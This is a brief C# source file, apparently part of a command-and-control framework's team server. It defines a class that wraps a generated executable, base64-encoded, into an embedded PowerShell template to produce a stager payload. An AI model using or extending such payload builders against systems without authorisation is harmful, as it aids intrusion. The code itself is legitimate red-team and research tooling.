using System;
using System.Text;
using System.Threading.Tasks;

namespace TeamServer.Models
{
    public class PoshPayload : Payload
    {
        public override async Task Generate()
        {
            var exe = new ExePayload { Handler = Handler };
            await exe.Generate();

            var scriptBytes = await Utilities.GetEmbeddedResource("drone.ps1");
            
            var scriptText = Encoding.UTF8.GetString(scriptBytes);
            scriptText = scriptText.Replace("{{DATA}}", Convert.ToBase64String(exe.Bytes));

            Bytes = Encoding.UTF8.GetBytes(scriptText);
        }
    }
}